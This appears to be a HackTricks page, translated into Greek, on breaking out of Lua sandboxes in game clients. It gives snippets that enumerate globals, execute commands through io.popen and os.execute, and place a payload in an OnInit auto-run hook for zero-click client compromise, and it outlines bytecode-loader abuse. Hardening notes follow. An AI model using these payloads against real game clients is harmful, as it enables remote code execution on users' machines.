# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Αυτή η σελίδα συγκεντρώνει πρακτικές τεχνικές για την απαρίθμηση και το breakout από Lua "sandboxes" που είναι ενσωματωμένα σε εφαρμογές (κυρίως game clients, plugins ή in-app scripting engines). Πολλά engines εκθέτουν ένα περιορισμένο περιβάλλον Lua, αλλά αφήνουν προσβάσιμα ισχυρά globals που επιτρέπουν arbitrary command execution ή ακόμη και native memory corruption όταν εκτίθενται bytecode loaders.

Βασικές ιδέες:
- Αντιμετωπίστε το VM ως άγνωστο περιβάλλον: απαριθμήστε το _G και ανακαλύψτε ποια επικίνδυνα primitives είναι προσβάσιμα.
- Όταν τα stdout/print είναι blocked, καταχραστείτε οποιοδήποτε in-VM UI/IPC channel ως output sink για να παρατηρείτε τα αποτελέσματα.
- Αν τα io/os είναι exposed, συχνά έχετε direct command execution (io.popen, os.execute).
- Αν τα load/loadstring/loadfile είναι exposed, η εκτέλεση crafted Lua bytecode μπορεί να υπονομεύσει την memory safety σε ορισμένες versions (οι verifiers των ≤5.1 μπορούν να παρακαμφθούν· ο 5.2 αφαίρεσε τον verifier), επιτρέποντας advanced exploitation.

## Enumerate the sandboxed environment

- Κάντε dump το global environment για να καταγράψετε τα προσβάσιμα tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Αν δεν είναι διαθέσιμη η print(), αξιοποιήστε εκ νέου τα κανάλια εντός του VM. Παράδειγμα από ένα script VM διαχείρισης κατοικιών MMO, όπου η έξοδος συνομιλίας λειτουργεί μόνο μετά από μια κλήση ήχου· το παρακάτω δημιουργεί μια αξιόπιστη συνάρτηση εξόδου:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Γενικεύστε αυτό το pattern για τον στόχο σας: οποιοδήποτε textbox, toast, logger ή UI callback που δέχεται strings μπορεί να λειτουργήσει ως stdout για reconnaissance.

## Direct command execution if io/os is exposed

Αν το sandbox εξακολουθεί να εκθέτει τις standard libraries io ή os, πιθανότατα έχετε άμεσο command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Σημειώσεις:

- Η εκτέλεση πραγματοποιείται μέσα στο client process· πολλά επίπεδα anti-cheat/antidebug που αποκλείουν external debuggers δεν εμποδίζουν τη δημιουργία process μέσα στο VM.
- Ελέγξτε επίσης: package.loadlib (arbitrary DLL/.so loading), require με native modules, το ffi του LuaJIT (εφόσον υπάρχει) και τη debug library (μπορεί να αυξήσει τα privileges μέσα στο VM).

## Triggers χωρίς κλικ μέσω auto-run callbacks

Αν η host application προωθεί scripts στους clients και το VM εκθέτει auto-run hooks (π.χ. OnInit/OnLoad/OnEnter), τοποθετήστε εκεί το payload σας για drive-by compromise μόλις φορτωθεί το script:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Οποιοδήποτε αντίστοιχο callback (OnLoad, OnEnter κ.λπ.) γενικεύει αυτή την τεχνική όταν τα scripts μεταδίδονται και εκτελούνται αυτόματα στον client.

## Επικίνδυνες primitives που πρέπει να αναζητούνται κατά το recon

Κατά την απαρίθμηση του _G, αναζητήστε συγκεκριμένα:
- io, os: io.popen, os.execute, file I/O, πρόσβαση σε env.
- load, loadstring, loadfile, dofile: εκτέλεση source ή bytecode· υποστηρίζει τη φόρτωση μη αξιόπιστου bytecode.
- package, package.loadlib, require: φόρτωση dynamic libraries και επιφάνεια modules.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo και hooks.
- Μόνο στο LuaJIT: ffi.cdef, ffi.load για απευθείας κλήση native code.

Ελάχιστα παραδείγματα χρήσης (αν είναι προσβάσιμα):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Προαιρετική κλιμάκωση: abuse των Lua bytecode loaders

Όταν τα load/loadstring/loadfile είναι προσβάσιμα, αλλά τα io/os είναι περιορισμένα, η εκτέλεση crafted Lua bytecode μπορεί να οδηγήσει σε αποκάλυψη μνήμης και primitives καταστροφής. Βασικά facts:
- Το Lua ≤ 5.1 περιλάμβανε bytecode verifier με γνωστά bypasses.<sup>[[4]](#references)</sup>
- Το Lua 5.2 αφαίρεσε εντελώς τον verifier (επίσημη θέση: οι εφαρμογές θα πρέπει απλώς να απορρίπτουν precompiled chunks), διευρύνοντας το attack surface όταν η φόρτωση bytecode δεν απαγορεύεται.<sup>[[2]](#references)[[3]](#references)</sup>
- Τα workflows συνήθως περιλαμβάνουν: leak pointers μέσω in-VM output, δημιουργία bytecode που προκαλεί type confusions (π.χ. γύρω από το FORLOOP ή άλλα opcodes) και, στη συνέχεια, pivot σε arbitrary read/write ή native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Αυτή η διαδρομή εξαρτάται από το engine/version και απαιτεί RE. Δείτε τα references για αναλυτικές deep dives, exploitation primitives και παραδείγματα gadgetry σε games.

## Σημειώσεις detection και hardening (για defenders)

- Server side: απορρίπτετε ή ξαναγράφετε user scripts· επιτρέπετε safe APIs μέσω allowlist· αφαιρείτε ή συνδέετε με κενές υλοποιήσεις τα io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: εκτελείτε το Lua με minimal _ENV, απαγορεύετε τη φόρτωση bytecode, επαναφέρετε έναν strict bytecode verifier ή signature checks και αποκλείετε τη δημιουργία processes από το client process.
- Telemetry: δημιουργήστε alert για δημιουργία child process από το gameclient λίγο μετά τη φόρτωση script· συσχετίστε το με UI/chat/script events.

## References

- [1] [Αυτό το σπίτι είναι στοιχειωμένο: ένα RCE δεκαετίας στον AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Ανάλυση Bytecode: Αποκωδικοποίηση των Lua Security Flaws του Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Συζήτηση για την κατάργηση του bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist με verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
